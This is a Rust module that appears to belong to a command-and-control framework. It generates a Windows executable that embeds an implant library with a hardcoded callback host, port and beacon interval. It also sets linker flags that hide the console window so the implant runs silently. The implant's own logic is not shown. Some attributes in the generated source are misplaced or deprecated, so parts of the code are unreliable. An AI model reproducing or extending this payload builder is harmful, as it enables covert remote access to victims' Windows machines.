//! Module for generating a Windows-compatible payload executable that embeds the implant logic.
use std::fs;
use std::process::Command;
use std::path::PathBuf;
use std::error::Error;

/// Configuration for payload generation
#[derive(Debug)]
pub struct PayloadConfig {
    pub host: String,
    pub port: u16,
    pub interval: u64,
}

/// Helper for building a tiny Windows EXE which simply calls into `rb_implant::run_implant()`
pub struct Payload;

impl Payload {
    /// Generate a Windows-compatible EXE payload with the implant library baked in.
    pub fn generate_with_config(config: &PayloadConfig) -> Result<PathBuf, Box<dyn Error>> {
        // 1) Write a minimal Cargo.toml that depends on the local rb_implant crate
        let manifest = r#"
[package]
name = "rb_payload"
version = "0.1.0"
edition = "2021"

[dependencies]
rb_implant = { path = "../rb_implant" }
tokio = { version = "1", features = ["full"] }

[target.x86_64-pc-windows-gnu]
rustflags = ["-C", "link-args=-mwindows "]
"#;
        fs::create_dir_all("rb_payload_build/src")?;
        fs::write("rb_payload_build/Cargo.toml", manifest)?;

        // 2) Write main.rs that configures and invokes the shared implant entry-point
        let main_rs = format!(r#"
use rb_implant::{{Args, run_implant_with_args}};

#![feature(link_args)]
#[link_args = "-Wl,--subsystem,windows"]
extern "C" {{}}

#[tokio::main]
async fn main() {{
    // Use hardcoded configuration
    let args = Args {{
        host: "{}".to_string(),
        port: {},
        interval: {},
    }};

    if let Err(e) = run_implant_with_args(args).await {{
        eprintln!("Fatal error: {{}}", e);
        std::process::exit(1);
    }}
}}
"#, config.host, config.port, config.interval);

        fs::write("rb_payload_build/src/main.rs", main_rs)?;

        // 3) Build the project targeting Windows GNU
        println!("Building payload for Windows...");
        let output = Command::new("cargo")
            .current_dir("rb_payload_build")
            .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
            .output()?;
            
        if !output.status.success() {
            return Err(format!(
                "Build failed: {}",
                String::from_utf8_lossy(&output.stderr)
            ).into());
        }

        // 4) Return the path to the .exe
        let exe_path = PathBuf::from(
            "rb_payload_build/target/x86_64-pc-windows-gnu/release/rb_payload.exe",
        );
        
        if !exe_path.exists() {
            return Err("Build completed but executable not found at expected path".into());
        }
        
        Ok(exe_path)
    }
}
